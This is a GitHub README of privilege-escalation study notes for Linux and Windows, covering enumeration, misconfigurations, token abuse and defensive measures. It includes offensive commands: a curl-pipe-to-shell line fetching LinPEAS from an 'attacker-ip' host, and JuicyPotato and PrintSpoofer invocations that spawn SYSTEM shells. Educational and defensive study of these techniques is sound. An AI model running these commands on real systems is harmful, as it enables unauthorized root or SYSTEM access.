# 🔐 Privilege Escalation — Linux & Windows

![Status](https://img.shields.io/badge/status-active-brightgreen)
![Level](https://img.shields.io/badge/level-intermediate-blue)
![License](https://img.shields.io/badge/license-MIT-lightgrey)

> A comprehensive collection of notes covering **Linux and Windows privilege escalation**, from enumeration and common misconfigurations to kernel exploitation, access-token abuse, service vulnerabilities, and automated enumeration with **LinPEAS** and **WinPEAS**.

Privilege escalation is the process of obtaining privileges beyond those initially granted to a compromised account or process. This section covers both major operating-system families and focuses on understanding **why a privilege-escalation technique works**, how to enumerate for it, how different techniques relate to one another, and how the underlying weaknesses can be prevented.

> ⚠️ A note on the folder tree below: the source PDFs on disk currently have a numbering collision (two files named `04`/`05` "PATH Hijacking," and two files named `06`, one for NFS and one for Writable Files). The tree below shows the **corrected** sequence — matching the order used throughout this README — but the actual filenames in the repository should be renamed to match, to avoid one file silently overwriting the other during sync.

---

## 📖 Table of Contents

- [Linux Privilege Escalation](#-linux-privilege-escalation)
  - [01. SUID Binaries](#-01-suid-binaries)
  - [02. Capabilities](#-02-capabilities)
  - [03. Cron Jobs](#-03-cron-jobs)
  - [04. PATH Hijacking](#-04-path-hijacking)
  - [05. NFS](#-05-nfs)
  - [06. Writable Files](#-06-writable-files)
  - [07. Kernel Exploits](#️-07-kernel-exploits)
  - [08. LinPEAS](#-08-linpeas)
- [Windows Privilege Escalation](#-windows-privilege-escalation)
  - [09. Unquoted Service Paths](#-09-unquoted-service-paths)
  - [10. AlwaysInstallElevated](#-10-alwaysinstallelevated)
  - [11. Token Impersonation](#-11-token-impersonation)
  - [12. SeImpersonatePrivilege](#-12-seimpersonateprivilege)
  - [13. Juicy Potato](#-13-juicy-potato)
  - [14. PrintSpoofer](#-14-printspoofer)
  - [15. WinPEAS](#-15-winpeas)
- [Linux vs. Windows Comparison](#️-linux-vs-windows-privilege-escalation)
- [How the Techniques Connect](#-how-the-techniques-connect)
- [Recommended Learning Path](#-recommended-learning-path)
- [Common Enumeration Workflow](#-common-enumeration-workflow)
- [Key Concepts](#-key-concepts)
- [Defensive Measures](#️-defensive-measures)
- [MITRE ATT&CK Coverage](#-mitre-attck-coverage)
- [Suggested Lab Practice](#-suggested-lab-practice)
- [Enumeration Tools](#-enumeration-tools)
- [Enumeration vs. Exploitation](#-enumeration-vs-exploitation)
- [Technique Comparison](#-technique-comparison)
- [Skills You'll Learn](#-skills-youll-learn)
- [Final Takeaways](#-final-takeaways)
- [Folder Structure](#-folder-structure)
- [Ethical & Legal Use](#️-ethical--legal-use)
- [Author](#-author)
- [License](#-license)

---

## 🐧 Linux Privilege Escalation

The Linux series follows a progression from individual privilege mechanisms and configuration mistakes toward broader enumeration and kernel-level exploitation. The first seven guides focus on individual techniques, while **LinPEAS** brings the enumeration checks together into one automated workflow.

### 🔴 01. SUID Binaries

**What is SUID?** **SUID (Set User ID)** is a Linux permission bit that causes an executable to run with the permissions of its owner rather than the permissions of the user executing it.

```bash
ls -l /usr/bin/passwd
```

A typical SUID binary appears as `-rwsr-xr-x` — the `s` indicates the SUID bit. A SUID binary owned by `root` can therefore execute with root privileges. The security problem occurs when a SUID-root binary can be manipulated into performing an unintended privileged action.

**Enumeration**
```bash
find / -perm -4000 -type f 2>/dev/null
# or
find / -perm -u=s -type f 2>/dev/null
```

**Analysis** — not every SUID binary is vulnerable. Compare discovered binaries against **GTFOBins**, an important reference for determining whether standard Unix binaries have known privilege-escalation techniques.

**Common exploitation categories:**
```text
SUID binary
    ├── GTFOBins technique
    ├── Writable library dependency
    ├── LD_PRELOAD
    └── PATH hijacking
```

The preferred analysis order: check documented GTFOBins techniques first, then investigate writable dependencies, `LD_PRELOAD` conditions, and internal PATH resolution.

**Quick reference:** `find / -perm -4000 -type f 2>/dev/null` → cross-reference against GTFOBins.
**ATT&CK:** `T1548.001` — Abuse Elevation Control Mechanism: Setuid and Setgid

### 🟠 02. Capabilities

Linux capabilities provide a more granular alternative to traditional root privileges. Instead of giving a process the entire set of root privileges, Linux can grant individual capabilities such as `CAP_SETUID`, `CAP_DAC_OVERRIDE`, `CAP_SYS_ADMIN`, `CAP_SETGID`, `CAP_FOWNER`, `CAP_CHOWN`, `CAP_NET_ADMIN` — described as **SUID's more granular sibling**.

**File capabilities**
```bash
getcap -r / 2>/dev/null
# Example: /usr/bin/python3.9 = cap_setuid+ep
```

**Process capabilities**
```bash
cat /proc/self/status | grep Cap
capsh --print
```
Suffixes: `e` = Effective, `p` = Permitted, `i` = Inheritable

**High-value capabilities**

| Capability | Security Impact |
|---|---|
| `cap_setuid` | Can allow UID changes |
| `cap_dac_override` | Can bypass file permission checks |
| `cap_sys_admin` | Broad administrative capability |
| `cap_setgid` | Can change group identity |
| `cap_fowner` | Can bypass ownership restrictions |
| `cap_chown` | Can change file ownership |
| `cap_net_admin` | Network administration |

**ATT&CK:** `T1548` — Abuse Elevation Control Mechanism

### 🟡 03. Cron Jobs

**Cron** is Linux's time-based job scheduler. A privilege-escalation opportunity exists when a privileged cron job executes something that a lower-privileged user can modify.

**Enumeration**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l
crontab -l -u root
```

For every interesting cron entry, check: is the script writable? Is its parent directory writable? Does it call another command without a full path? Does it use an unsafe wildcard?

**Common exploitation patterns:**
1. **Writable cron script** — root cron job → writable script → attacker modifies script → cron executes it as root.
2. **PATH hijacking** — root cron job → bare command → attacker-controlled PATH location → malicious binary.
3. **Wildcard injection** — unsafe wildcard expansion can cause attacker-controlled filenames to be interpreted as command-line options.

Also recommended: **pspy**, for observing scheduled processes in real time when direct access to cron configuration is unavailable.

**ATT&CK:** `T1053.003` — Scheduled Task/Job: Cron

### 🟢 04. PATH Hijacking

PATH hijacking occurs when a privileged program executes a command using its **bare name** (e.g. `tar`) instead of an absolute path (e.g. `/usr/bin/tar`). Linux searches directories in `$PATH` from left to right and executes the first matching binary.

**Enumeration**
```bash
echo $PATH
echo $PATH | tr ':' '\n'
echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {} 2>/dev/null
echo $PATH | grep -E '(^|:)\.(:|$)'   # check for current directory in PATH
```

**Attacker-controlled PATH concept:**
```text
Privileged program → executes "command" → PATH lookup →
writable directory found first → attacker-controlled binary →
runs with privileged process privileges
```

**Finding bare commands:**
```bash
strings <binary>
strace -f -tt -o trace.log ./binary
```
`pspy` can also help observe system-wide process execution.

**Common command names worth checking:** `tar`, `cp`, `mv`, `cat`, `chmod`, `chown`, `service`, `systemctl`, `python`, `perl`, `curl`, `wget`, `git`, `docker`, `mysql`

**ATT&CK:** `T1574.007` — Hijack Execution Flow: Path Interception by PATH Environment Variable

### 🔵 05. NFS

**NFS (Network File System)** introduces a network trust boundary into the Linux privilege-escalation series. The key issue is that NFS can rely on client-supplied numeric UID/GID information rather than cryptographically proving the identity of the connecting user.

**Root squashing (normal behavior):** client claims UID 0 → server applies root squashing → client root becomes unprivileged.

**`no_root_squash` (dangerous configuration):** with this setting, a client connecting as UID 0 can be treated as root for operations on the exported share.

**Enumeration**
```bash
cat /etc/exports                 # on the target
showmount -e <target-ip>         # remote enumeration
# Example: /srv/nfs/shared 192.168.1.0/24(rw,no_root_squash)
```
Important options: `rw`, `no_root_squash`, `insecure`. A writable export combined with `no_root_squash` is particularly important for this escalation path.

**Key concept:** root on authorized NFS client → `no_root_squash` export → create root-owned files → target sees root-owned files → potential SUID-based escalation. This creates a direct conceptual connection between **NFS** and the earlier **SUID** guide.

### 🟣 06. Writable Files

Writable files are the broadest Linux privilege-escalation category in this series. The common pattern: privileged process trusts/reads/executes a resource → a lower-privileged user can modify that resource → privilege escalation. This generalizes the earlier SUID, Cron, PATH, and NFS techniques.

**Enumeration**
```bash
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null
find / -perm -o+w -type f 2>/dev/null   # world-writable files
find / -perm -o+w -type d 2>/dev/null   # world-writable directories
```

**Important targets**

| Target | Potential Impact |
|---|---|
| `/etc/passwd` | Account manipulation |
| `/etc/shadow` | Password/hash manipulation |
| `/etc/sudoers` | Sudo privilege changes |
| `*.service` | Systemd execution |
| `*.timer` | Scheduled execution |
| Writable `.so` | Library hijacking |
| Privileged scripts | Arbitrary command execution |

**Sticky bit:** `ls -ld /tmp` typically shows `drwxrwxrwt` — the `t` restricts deletion/renaming of files inside a world-writable directory.

**ATT&CK:** `T1222.002` — File and Directory Permissions Modification

### ⚠️ 07. Kernel Exploits

Kernel exploitation is fundamentally different from the earlier techniques. Previous techniques primarily abused permissions, configuration, PATH resolution, scheduled tasks, and network trust. Kernel exploits target an actual vulnerability in the kernel's code — buffer overflows, use-after-free, race conditions, logic flaws, and kernel memory corruption. Successful exploitation can target kernel credential structures or kernel execution flow.

**Enumeration**
```bash
uname -a
cat /etc/os-release
cat /proc/version
lsmod
```

**Research**
```bash
searchsploit linux kernel <version>
```
Matching the exploit to the target kernel version is emphasized as critical.

**Safety** — kernel exploits carry a meaningful risk of system crash, kernel panic, service disruption, data loss, or unstable system state. Before testing: ✓ snapshot/backup, ✓ matching kernel version, ✓ isolated lab validation, ✓ explicit authorization.

**ATT&CK:** `T1068` — Exploitation for Privilege Escalation

### 🟤 08. LinPEAS

**LinPEAS** is the automation layer that brings the Linux series together. It performs many of the enumeration checks covered by SUID, Capabilities, Cron, PATH, NFS, Writable Files, and Kernel information — along with additional system checks.

**Obtaining and running**
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a | tee linpeas_output.txt

# Fileless execution
curl -s http://attacker-ip:8000/linpeas.sh | sh
```
Verify LinPEAS was obtained from the official PEASS-ng repository — modified scripts represent a supply-chain risk.

**Reading the output** — map findings back to the individual guides: SUID → SUID guide, Capabilities → Capabilities guide, Cron → Cron guide, PATH → PATH Hijacking, NFS → NFS, Writable files → Writable Files, Kernel suggestions → Kernel Exploits.

**Prioritization:** (1) red/high-priority findings, (2) simple findings before complicated chains, (3) kernel exploits last because of stability risk.

> **LinPEAS finds the door; it does not open it.** The actual exploitation still requires understanding the technique behind the finding.

---

## 🪟 Windows Privilege Escalation

The Windows series contains seven guides. The first two focus on configuration problems (Unquoted Service Paths, AlwaysInstallElevated); the following four move into Windows access-token abuse (Token Impersonation, SeImpersonatePrivilege, Juicy Potato, PrintSpoofer). Finally, WinPEAS provides automated enumeration across the entire series.

### 🔴 09. Unquoted Service Paths

Windows services have executable paths stored in the system configuration. When a service path contains spaces but is not quoted, Windows may attempt multiple possible executable locations while resolving the path.

Example: `C:\Program Files\Some Vendor\Some Service\service.exe` can resolve, in order, as `C:\Program.exe`, `C:\Program Files\Some.exe`, `C:\Program Files\Some Vendor\Some.exe`, `C:\Program Files\Some Vendor\Some Service\service.exe`. If an attacker can write to an earlier candidate location, Windows may execute the attacker's file with the service's privileges.

**Enumeration**
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v '"'
```
```powershell
Get-WmiObject win32_service |
Where-Object {$_.PathName -notlike 'C:\Windows*' -and $_.PathName -notlike '"*'} |
Select Name, DisplayName, PathName, StartMode
```

**What makes a path exploitable:** unquoted path + spaces in path + writable earlier directory = potential escalation. Service privilege level and startup behavior also matter — a SYSTEM service that starts automatically is a higher-value target than a low-privilege manual service.

**Prevention:** always quote service executable paths (`"C:\Program Files\Some Vendor\Some Service\service.exe"`) and ensure ordinary users cannot write to application installation directories.

**ATT&CK / CWE:** `CWE-428` — Unquoted Search Path or Element; `T1574` — Hijack Execution Flow

### 🟠 10. AlwaysInstallElevated

**AlwaysInstallElevated** is a Windows Installer policy misconfiguration. When enabled, it can cause MSI packages launched by a standard user to be installed with **SYSTEM privileges**.

**Critical requirement:** both registry values must be enabled.
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Both must return `REG_DWORD 0x1` — either key alone is insufficient.

**Concept:** standard user → malicious MSI → Windows Installer → AlwaysInstallElevated → SYSTEM-level installation.

**Quick reference:** check both registry keys are `0x1` → build an authorized lab MSI payload → deploy via `msiexec` → confirm with `whoami`.

### 🟡 11. Token Impersonation

Windows uses **access tokens** to represent security contexts (user SID, group SIDs, privileges). Processes and threads use these tokens when Windows performs authorization checks.

**Impersonation** — Windows legitimately allows a thread to temporarily adopt another security context, necessary for services such as file servers, RPC services, and print services. The security issue occurs when an attacker-controlled process can obtain and impersonate a more privileged token.

**Conceptual workflow:** low-privileged process → obtain privileged token → impersonate token → create process → higher-privileged context.

> Token impersonation is not itself a vulnerability — it's a legitimate Windows security mechanism that becomes dangerous when the attacker can control the conditions under which a privileged token becomes available.

### 🟢 12. SeImpersonatePrivilege

`SeImpersonatePrivilege` is the central prerequisite for the **Potato-style** techniques covered later, and is particularly important for service-account footholds.

**Check the privilege**
```cmd
whoami /priv
```
Look for `SeImpersonatePrivilege` — possible states: Enabled, Disabled, Absent. If absent, this specific technique family isn't available from the current context.

**Common holders:** `NT AUTHORITY\SYSTEM`, `NT AUTHORITY\LOCAL SERVICE`, `NT AUTHORITY\NETWORK SERVICE`, Administrators, IIS application pool identities, MSSQL service accounts.

**General Potato pattern:** control a listener/named pipe → trigger a privileged process → receive a privileged authentication/token → impersonate the token → spawn a process with that token.

> **SeImpersonatePrivilege is the permission, not the exploit.**

**ATT&CK:** `T1134.001` — Access Token Manipulation: Token Impersonation/Theft

### 🔵 13. Juicy Potato

**Juicy Potato** is a well-known implementation of the Potato-style token-impersonation technique. Its original implementation uses COM/DCOM, CLSID, OXID resolver behavior, and NTLM authentication to obtain and impersonate a SYSTEM-level token.

**Version matters:** the original mechanism is version-sensitive — older Windows Server / Windows 10 builds work with the original Juicy Potato, while modern patched versions require updated approaches such as **JuicyPotatoNG**.

**Original tool concept:** select CLSID → trigger SYSTEM COM object → capture/impersonate token → spawn process.
```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```
The CLSID must correspond to the target Windows version/build.

**JuicyPotatoNG**
```cmd
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a
```
The `-a` option allows automatic CLSID selection rather than requiring manual CLSID selection.

> A failure of the original Juicy Potato does **not** necessarily mean `SeImpersonatePrivilege` exploitation is impossible — it may simply mean the original trigger mechanism is patched.

### 🟣 14. PrintSpoofer

PrintSpoofer uses a different trigger mechanism from Juicy Potato while relying on the same underlying `SeImpersonatePrivilege` condition. Instead of abusing DCOM activation, PrintSpoofer abuses behavior involving the **Windows Print Spooler** and named pipes.

**Core concept:** `SeImpersonatePrivilege` + Print Spooler running → controlled named pipe → SYSTEM process connects → SYSTEM token becomes available → token impersonation → SYSTEM process.

**Preconditions**
```cmd
whoami /priv        :: look for SeImpersonatePrivilege: Enabled
sc query spooler     :: or Get-Service -Name Spooler in PowerShell
```
The Print Spooler service must be running for this technique to work.

**Usage**
```cmd
PrintSpoofer.exe -i -c "cmd.exe"                          :: interactive
PrintSpoofer.exe -c "cmd.exe /c <command>"                :: non-interactive
```
After exploitation, verify with `whoami` — expected identity: `nt authority\system`.

**Prevention:** disable Print Spooler where printing isn't required; where it is, patch regularly, restrict `SeImpersonatePrivilege` where practical, and monitor unusual named-pipe activity and unexpected `spoolsv.exe` child processes.

### 🟤 15. WinPEAS

**WinPEAS** is the Windows equivalent of LinPEAS in this repository. It automates enumeration across the Windows privilege-escalation techniques covered in the previous guides, surfacing information on: Unquoted Service Paths, AlwaysInstallElevated, Token Privileges, SeImpersonatePrivilege, Print Spooler, System Information, Installed Software, Scheduled Tasks, Saved Credentials, Unattended Installation Files, and Registry configuration.

**Variants:** `winPEAS.exe`, `winPEASx86.exe`, `winPEASx64.exe`, `winPEAS.bat`, `winPEAS.ps1`. Always obtain tools from the official PEASS-ng repository and verify their source.

```cmd
.\winpeas.exe > winpeas_output.txt
```

**Prioritization:** (1) current token privileges, (2) AlwaysInstallElevated, (3) unquoted service paths, (4) other findings. `SeImpersonatePrivilege` is especially important because it connects directly to multiple later techniques.

> **WinPEAS automates discovery, not exploitation or judgment.** The value of the output depends on understanding what each finding means.

---

## ⚔️ Linux vs. Windows Privilege Escalation

| Concept | Linux | Windows |
|---|---|---|
| Primary privileged identity | `root` | `SYSTEM` / Administrator |
| Permission mechanism | UID/GID | SID / Access Token |
| Granular privilege model | Capabilities | Token privileges |
| SUID equivalent | SUID binaries | Privileged services / tokens |
| Scheduled execution | Cron | Services / scheduled tasks |
| Search-path issue | `$PATH` | Unquoted service path |
| Network trust example | NFS | Windows authentication/token mechanisms |
| Kernel exploitation | Linux kernel | Windows kernel |
| Automated enumeration | LinPEAS | WinPEAS |
| Common token technique | UID/capabilities | Token impersonation |
| Major exploit family | SUID / PATH / Cron | Potato / PrintSpoofer |

---

## 🔗 How the Techniques Connect

**Linux**
```text
Initial Shell → Enumeration
                    ├── SUID
                    ├── Capabilities
                    ├── Cron
                    ├── PATH
                    ├── NFS
                    ├── Writable Files
                    └── Kernel Version
                            ↓
                    Privilege Escalation
                            ↓
                          root
```
LinPEAS automates much of the enumeration stage and helps identify which branch deserves further investigation.

**Windows**
```text
Initial Shell / Service Account → Enumeration
     ┌────────────────┴────────────────┐
     ▼                                 ▼
Configuration                     Token Abuse
 ├── Unquoted Paths                 ├── Token Impersonation
 └── AlwaysInstallElevated          ├── SeImpersonatePrivilege
                                     ├── Juicy Potato
                                     └── PrintSpoofer
                                              ↓
                                           SYSTEM
```
WinPEAS brings the enumeration checks together and allows findings to be mapped back to the individual techniques.

---

## 🧭 Recommended Learning Path

**Phase 1 — Linux Fundamentals:** 01 SUID Binaries → 02 Capabilities → 03 Cron Jobs → 04 PATH Hijacking → 05 NFS → 06 Writable Files. These establish the main configuration and permission-based privilege-escalation patterns.

**Phase 2 — Advanced Linux:** 07 Kernel Exploits. Study kernel exploitation only after understanding the previous enumeration-based techniques.

**Phase 3 — Linux Automation:** 08 LinPEAS. At this stage, use LinPEAS to rediscover the findings you already understand manually — it's framed as the final Linux step because understanding the underlying seven techniques is necessary to interpret its output correctly.

**Phase 4 — Windows Fundamentals:** 09 Unquoted Service Paths → 10 AlwaysInstallElevated. These introduce Windows configuration-based privilege escalation.

**Phase 5 — Windows Token Abuse:** 11 Token Impersonation → 12 SeImpersonatePrivilege → 13 Juicy Potato → 14 PrintSpoofer. This sequence matters because the later techniques depend on concepts introduced earlier.

**Phase 6 — Windows Automation:** 15 WinPEAS. Use it after learning the individual techniques so that its findings are meaningful rather than a list of unexplained red flags.

---

## 🔍 Common Enumeration Workflow

```text
1. Obtain initial foothold
2. Identify current user
3. Identify current privileges
4. Identify operating-system version
5. Enumerate files and permissions
6. Enumerate services / scheduled tasks
7. Enumerate special privileges
8. Identify configuration weaknesses
9. Identify vulnerable software / kernel
10. Prioritize findings
11. Validate in an authorized lab/engagement
12. Confirm elevated privileges
```

> **Enumeration comes before exploitation.**

---

## 🧠 Key Concepts

| Technique | Core Idea |
|---|---|
| SUID | Executable → owner privileges → potential root execution |
| Capabilities | Root privileges split into individual capabilities; some are still root-equivalent |
| Cron | Root scheduled task + attacker-controlled script/resource → root execution |
| PATH Hijacking | Privileged process + bare command → PATH lookup → attacker-controlled executable |
| NFS | Remote UID trust + `no_root_squash` → root-owned files on target |
| Writable Files | Privileged process trusts a writable resource → privilege escalation |
| Kernel Exploit | Userspace → kernel vulnerability → kernel-level compromise |
| Token Impersonation | Access token → privileged token acquisition → impersonation → higher-privileged process |
| SeImpersonatePrivilege | Permission that allows token impersonation → enables Potato-style techniques |
| Juicy Potato | SeImpersonatePrivilege + DCOM/COM trigger → SYSTEM token |
| PrintSpoofer | SeImpersonatePrivilege + Print Spooler → named pipe trigger → SYSTEM token |

---

## 🛡️ Defensive Measures

### Linux

- **SUID** — minimize SUID binaries, remove unnecessary SUID permissions, audit regularly, review unusual/custom binaries, check library dependencies.
- **Capabilities** — grant only what's required, audit file capabilities regularly, pay particular attention to `CAP_SETUID`, `CAP_DAC_OVERRIDE`, `CAP_SYS_ADMIN`.
- **Cron** — ensure privileged cron scripts aren't writable by unprivileged users, secure parent directories, use absolute paths, avoid unsafe wildcards, audit scheduled jobs.
- **PATH** — use absolute paths for privileged commands, don't place writable directories in privileged `$PATH`, avoid untrusted influence over privileged environment variables, remove unnecessary `.` entries.
- **NFS** — avoid unnecessary exports, prefer root squashing, avoid `no_root_squash` unless required, restrict export networks/hosts, use appropriate authentication.
- **Writable Files** — critical files (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, systemd unit files, privileged libraries) should not be writable by unprivileged users; use recurring permission auditing and file-integrity monitoring.
- **Kernel** — patch regularly, remove obsolete kernels, track kernel CVEs, test patches before deployment, avoid known-vulnerable kernel versions.

### Windows

- **Unquoted Service Paths** — always quote executable paths; restrict write access to application installation directories.
- **AlwaysInstallElevated** — disable the policy unless genuinely required; audit both registry locations; avoid allowing arbitrary MSI packages to run elevated.
- **Token Impersonation** — apply least privilege to service accounts, review unnecessary token privileges, monitor unusual token manipulation, restrict privileged service contexts.
- **SeImpersonatePrivilege** — review service-account privileges, apply least privilege, remove unnecessary impersonation rights. Reducing unnecessary assignment of this privilege is the most direct upstream defense against the broader Potato/PrintSpoofer family.
- **Print Spooler** — disable where printing is unnecessary; where required, keep Windows patched, monitor `spoolsv.exe` behavior and unusual named-pipe connections.
- **WinPEAS awareness** — monitor for offensive enumeration tools, maintain updated AV/EDR signatures, perform regular defensive enumeration, investigate unexpected privilege-related findings, and use WinPEAS proactively during authorized hardening reviews.

---

## 🎯 MITRE ATT&CK Coverage

**Linux**
```text
T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid
T1053.003 — Scheduled Task/Job: Cron
T1574.007 — Hijack Execution Flow: Path Interception by PATH Environment Variable
T1222.002 — File and Directory Permissions Modification
T1068     — Exploitation for Privilege Escalation
```

**Windows**
```text
T1574     — Hijack Execution Flow
T1548.002 — Abuse Elevation Control Mechanism
T1134.001 — Access Token Manipulation: Token Impersonation/Theft
```

WinPEAS itself primarily performs discovery activities such as system and account discovery, while the actual privilege-escalation technique depends on the finding it identifies.

---

## 🧪 Suggested Lab Practice

Practice these techniques only on your own virtual machines, CTF environments, VulnHub machines, TryHackMe/HTB labs, or other authorized penetration-testing environments.

**Linux lab progression:** create a Linux lab VM → establish a low-privileged shell → enumerate SUID binaries → enumerate capabilities → inspect cron jobs → test PATH resolution → inspect NFS configuration → search writable files → identify kernel version → run LinPEAS → compare automated findings with manual enumeration → validate findings individually.

**Windows lab progression:** create a Windows lab VM → establish a low-privileged/service-account context → enumerate services → check unquoted paths → check AlwaysInstallElevated → run `whoami /priv` → identify SeImpersonatePrivilege → study token impersonation → study Juicy Potato/JuicyPotatoNG → study PrintSpoofer → run WinPEAS → map WinPEAS findings back to each technique.

---

## 🧩 Enumeration Tools

| Tool | Platform | Primary Purpose |
|---|---|---|
| `LinPEAS` | Linux | Automated privilege-escalation enumeration |
| `WinPEAS` | Windows | Automated privilege-escalation enumeration |
| `pspy` | Linux | Observe processes and scheduled execution |
| `GTFOBins` | Linux | Reference for exploitable Unix binaries |
| `searchsploit` | Linux / Security Labs | Search exploit database |
| `whoami /priv` | Windows | Enumerate token privileges |
| `Get-Service` | Windows | Enumerate Windows services |
| `wmic` | Windows | Service/path enumeration |

---

## 🔄 Enumeration vs. Exploitation

One of the most important lessons across this entire section is the difference between **finding a weakness** and **exploiting a weakness**.

```text
LinPEAS → finds SUID binary → you must understand SUID →
check GTFOBins/dependencies/PATH → validate exploitation path

WinPEAS → finds SeImpersonatePrivilege → understand token impersonation →
check relevant trigger mechanisms → Juicy Potato / PrintSpoofer
```

LinPEAS and WinPEAS therefore improve **speed and coverage**, but do not replace technique-specific knowledge.

---

## 📊 Technique Comparison

| Technique | OS | Primary Weakness | Typical Result |
|---|---|---|---|
| SUID | Linux | Dangerous SUID binary | `root` |
| Capabilities | Linux | Dangerous capability | `root` / elevated access |
| Cron | Linux | Writable scheduled resource | `root` |
| PATH Hijacking | Linux | Unsafe command resolution | `root` |
| NFS | Linux | `no_root_squash` / UID trust | `root` |
| Writable Files | Linux | Privileged process trusts writable resource | `root` |
| Kernel Exploit | Linux | Kernel vulnerability | Kernel/root |
| Unquoted Service Path | Windows | Path parsing + writable location | `SYSTEM` |
| AlwaysInstallElevated | Windows | MSI policy misconfiguration | `SYSTEM` |
| Token Impersonation | Windows | Privileged token abuse | Elevated token |
| SeImpersonatePrivilege | Windows | Token impersonation permission | `SYSTEM` |
| Juicy Potato | Windows | Potato token trigger | `SYSTEM` |
| PrintSpoofer | Windows | Print Spooler token trigger | `SYSTEM` |
| LinPEAS | Linux | Enumeration | Finds candidates |
| WinPEAS | Windows | Enumeration | Finds candidates |

---

## 🏆 Skills You'll Learn

**Linux:** SUID/SGID, Linux capabilities, cron exploitation, PATH hijacking, NFS trust and `no_root_squash`, writable files/directories, systemd-related writable resources, kernel privilege escalation, Linux privilege enumeration, LinPEAS, GTFOBins, pspy, Linux permissions.

**Windows:** Windows services, unquoted service paths, Windows Installer policies, AlwaysInstallElevated, access tokens, token impersonation, `SeImpersonatePrivilege`, Potato-style attacks, Juicy Potato, JuicyPotatoNG, PrintSpoofer, Print Spooler, Windows privilege enumeration, WinPEAS.

**General:** privilege-escalation methodology, enumeration before exploitation, misconfiguration analysis, permission auditing, security-token concepts, automated enumeration, MITRE ATT&CK mapping, defensive hardening, lab-based validation.

---

## 🧠 Final Takeaways

```text
LINUX
SUID              → Privileged executable
Capabilities      → Granular privileged permissions
Cron              → Privileged scheduled execution
PATH              → Unsafe command resolution
NFS               → Network identity trust
Writable Files    → Privileged process trusts writable resource
Kernel Exploits   → Vulnerability in the enforcement mechanism
LinPEAS           → Automated discovery

WINDOWS
Unquoted Service Paths   → Path parsing ambiguity
AlwaysInstallElevated    → MSI installation policy abuse
Token Impersonation      → Access-token security context abuse
SeImpersonatePrivilege   → Permission enabling impersonation
Juicy Potato             → COM/DCOM-based token trigger
PrintSpoofer             → Print Spooler / named-pipe token trigger
WinPEAS                  → Automated discovery
```

Privilege escalation is not a collection of isolated commands — the most important skill is recognizing the **underlying trust relationship** that allows a lower-privileged process to influence something operating with higher privileges. On Linux, most techniques reduce to a privileged process trusting something an attacker can modify or control. The kernel-exploitation guide is a different category, since the vulnerability exists in the kernel's implementation rather than in a permission or configuration decision. On Windows, the series progresses from configuration weaknesses into legitimate security mechanisms being abused, with the Windows access token and the ability to impersonate a more privileged security context as the shared concept behind the token-abuse techniques.

```text
Manual Enumeration → Understand the Technique → Automated Enumeration →
Prioritize Findings → Validate → Escalate Privileges
```

**Learn the technique manually first. Use LinPEAS/WinPEAS to make the process faster — not to replace understanding.**

---

## 📁 Folder Structure

```text
09_Privilege_Escalation_(Linux_&_Windows)
│
├── 🐧 Linux Privilege Escalation
│   ├── 01. Linux Privilege Escalation - SUID Binaries.pdf
│   ├── 02. Linux Privilege Escalation - Capabilities.pdf
│   ├── 03. Linux Privilege Escalation - Cron Jobs.pdf
│   ├── 04. Linux Privilege Escalation - PATH Hijacking.pdf
│   ├── 05. Linux Privilege Escalation - NFS.pdf
│   ├── 06. Linux Privilege Escalation - Writable Files.pdf
│   ├── 07. Linux Privilege Escalation - Kernel Exploits.pdf
│   └── 08. Linux Privilege Escalation - LinPEAS.pdf
│
├── 🪟 Windows Privilege Escalation
│   ├── 09. Windows Privilege Escalation - Unquoted Service Paths.pdf
│   ├── 10. Windows Privilege Escalation - AlwaysInstallElevated.pdf
│   ├── 11. Windows Privilege Escalation - Token Impersonation.pdf
│   ├── 12. Windows Privilege Escalation - SeImpersonatePrivilege.pdf
│   ├── 13. Windows Privilege Escalation - Juicy Potato.pdf
│   ├── 14. Windows Privilege Escalation - PrintSpoofer.pdf
│   └── 15. Windows Privilege Escalation - WinPEAS.pdf
│
└── README.md
```

*(Corrected numbering — rename the actual files on disk to match, since two currently share the same number/name.)*

---

## ⚠️ Ethical & Legal Use

All techniques and commands documented in this repository are intended for authorized penetration testing, cybersecurity education, CTF competitions, VulnHub machines, TryHackMe labs, Hack The Box labs, personal virtual machines, and authorized security research.

**Never attempt privilege escalation against systems you do not own or have explicit permission to test.**

---

## 👤 Author

**Omkar Sawant**
Cybersecurity Enthusiast | Aspiring Penetration Tester

- GitHub: [@omkarsawant1337](https://github.com/omkarsawant1337)
- LinkedIn: [omkar-sawant-vapt](https://linkedin.com/in/omkar-sawant-vapt)

---

## 📄 License

This project is licensed under the [MIT License](LICENSE).

---

🚀 **Learn → Enumerate → Understand → Validate → Document**
**Cybersecurity Knowledge Base**
